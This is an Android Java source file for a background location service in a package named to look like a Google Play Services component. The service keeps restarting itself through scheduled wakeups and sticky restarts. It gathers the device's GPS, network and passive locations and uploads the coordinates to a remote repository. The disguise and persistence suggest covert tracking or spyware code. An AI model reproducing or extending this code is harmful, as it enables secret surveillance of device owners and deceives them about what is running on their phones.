package com.google.android.gms.persistent.googleapps.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.data.event.Position;
import com.google.android.gms.persistent.googleapps.utils.Constants;
import com.google.android.gms.persistent.googleapps.utils.Preferences;

import java.util.Calendar;
import java.util.List;

import timber.log.Timber;

public class LocationService extends Service implements LocationListener {
    protected LocationManager locationManager;
    private Context context;
    private Preferences preferences;
    private int locationMode;
    private boolean isGPSProvider;
    private boolean isNetworkProvider;
    private boolean isPassiveProvider;
    private static final int SERVICE_REQUEST_CODE = 15;
    // The minimum distance to change Updates in meters
    private final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 50; // 100
    float bestAccuracy = 1000; // meters
    private final long MIN_TIME_UPDATES = 1000 * 60 * 5;
    private static long MIN_TIME_LAST_UPDATES = 1000 * 60 * 60 * 24; // 24 hour

    private final int RESTART_SERVICE = 1000 * 60 * 5;


    public LocationService() {
    }

    @Override
    public void onCreate() {
        context = App.getAppComponent().getContext();
        preferences = App.getAppComponent().getPreferences();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Timber.tag(LocationService.class.getSimpleName());

        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.MINUTE, preferences.getLocationUpdateTime());
        PendingIntent servicePendingIntent = PendingIntent.getService(this,
                SERVICE_REQUEST_CODE, new Intent(this, LocationService.class),// SERVICE_REQUEST_CODE
                PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                servicePendingIntent);

        if (preferences.getGeo() == 1)
            startTracker();
        super.onStartCommand(intent, flags, startId);
        return Service.START_STICKY;
    }

    private void startTracker() {
        try {
            locationMode = preferences.getModeLocation();
            locationManager = (LocationManager) context
                    .getSystemService(LOCATION_SERVICE);


            Timber.d("GetLocation ");
            // getting GPS status
            boolean isGPSEnabled = locationManager
                    .isProviderEnabled(LocationManager.GPS_PROVIDER);
            Timber.d("isGPS " + Boolean.toString(isGPSEnabled));
            // getting network
            boolean isNetworkProviderEnable = locationManager
                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            boolean isPassiveProviderEnable = locationManager
                    .isProviderEnabled(LocationManager.PASSIVE_PROVIDER);

            isGPSProvider = locationMode == Constants.GPS_PROVIDER && isGPSEnabled;
            isNetworkProvider = locationMode == Constants.NETWORK_PROVIDER && isNetworkProviderEnable;
            isPassiveProvider = locationMode == Constants.PASSIVE_PROVIDER && isPassiveProviderEnable;

            if (!isGPSProvider && !isNetworkProvider && !isPassiveProvider) {
                // no location provider is enabled
                return;
            } else {
                if (isGPSProvider) {
                    Timber.d("GPS Enabled");
                    setGPSLocation();
                }
                if (isNetworkProvider) {
                    if (isOnline())
                        setNetworkLocation();
                }
                if (isPassiveProvider)
                    setPassiveLocation();
                getLast();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getLast() {
        Location bestResult = null;
        Location location = null;
        double latitude = 0;
        double longitude = 0;
        String bestProvider = null;

        float accuracy = 0;
        long time = 0;
        long bestTime = 0;
        float bestAccuracy = 1000;
        long minTime = 0;
        List<String> matchingProviders = locationManager.getAllProviders();
        Timber.d("LocMan " + matchingProviders.toString());
        for (String provider : matchingProviders) {
            try {
                location = locationManager.getLastKnownLocation(provider);
            } catch (java.lang.SecurityException ex) {
                Timber.d("fail to request location update, ignore", ex);
            }
            if (location != null) {
                accuracy = location.getAccuracy();
                time = location.getTime();

                Timber.d("last update " + provider);
                long timeSys = System.currentTimeMillis();
                minTime = timeSys - MIN_TIME_LAST_UPDATES;

                Timber.d("time + accuracy " + Long.toString(time) + " " + Float.toString(accuracy));
                if ((time > minTime && accuracy < bestAccuracy)) {
                    bestResult = location;
                    longitude = location.getLongitude();
                    latitude = location.getLatitude();
                    bestAccuracy = accuracy;
                    bestTime = time;
                    bestProvider = provider;
                    Timber.d("bestAccuracy: " + bestTime + " " + accuracy + " " + bestResult);
                } else if (time < minTime && bestAccuracy == Float.MAX_VALUE
                        && time > bestTime) {
                    bestResult = location;
                    bestTime = time;
                    bestProvider = provider;
                    bestAccuracy = accuracy;
                    longitude = location.getLongitude();
                    latitude = location.getLatitude();
                    Timber.d("else " + Long.toString(bestTime) + " " + bestResult);
                }
            }

        }
        Position position = Position.newBuilder()
                .longitude(longitude)
                .latitude(latitude)
                .accuracy(accuracy)
                .date(time)
                .provider(bestProvider).build();
        sendData(position);
    }

    private boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
            return true;
        }
        return false;
    }

    private void setGPSLocation() {
        // locMetod = "network";
        Timber.d("GPS Position");
        try {
            Timber.d("GPS Position OK");
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                    MIN_TIME_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
        } catch (java.lang.SecurityException ex) {
            Timber.d("fail to request location update, ignore", ex);
        } catch (IllegalArgumentException ex) {
            Timber.d("network provider does not exist, " + ex.getMessage());
        }
    }

    public void setNetworkLocation() {
        try {
            Timber.d("Network Position OK");
            locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, MIN_TIME_UPDATES,
                    MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
        } catch (java.lang.SecurityException ex) {
            Timber.d("fail to request location update, ignore", ex);
        } catch (IllegalArgumentException ex) {
            Timber.d("network provider does not exist, " + ex.getMessage());
        }
    }

    public void setPassiveLocation() {
        try {
            locationManager.requestLocationUpdates(
                    LocationManager.PASSIVE_PROVIDER, MIN_TIME_UPDATES,
                    MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
        } catch (java.lang.SecurityException ex) {
            Timber.d("fail to request location update, ignore", ex);
        } catch (IllegalArgumentException ex) {
            Timber.d("network provider does not exist, " + ex.getMessage());
        }

    }

    private void sendData(Position position) {
        App.getAppComponent().getNetworkRepo()
                .addPositionOfDevice(Data.newBuilder().info(position)
                        .type(Constants.LOCATION)
                        .date(position.getDate())
                        .build());
    }


    @Override
    public void onLocationChanged(Location location) {

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {
        Intent i = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

}
